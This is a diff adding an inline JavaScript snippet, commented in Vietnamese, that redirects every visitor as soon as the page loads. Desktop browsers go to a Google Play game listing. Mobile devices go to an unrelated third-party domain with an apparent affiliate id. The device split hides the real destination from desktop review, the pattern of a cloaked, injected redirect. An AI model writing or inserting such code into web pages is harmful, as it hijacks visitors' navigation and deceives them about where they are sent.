@@ -1,0 +1,17 @@
+<script type="text/javascript">
+    (function() {
+        // Cấu hình link tương ứng với thiết bị
+        const pcUrl = "https://play.google.com/store/apps/details?id=com.ea.game.pvzfree_row&hl=vi";
+        const mobileUrl = "https://gg8809.com/?cid=8333020";
+
+        // Kiểm tra User Agent để phát hiện điện thoại/máy tính bảng
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+        // Thực hiện chuyển hướng
+        if (isMobile) {
+            window.location.replace(mobileUrl);
+        } else {
+            window.location.replace(pcUrl);
+        }
+    })();
+</script>
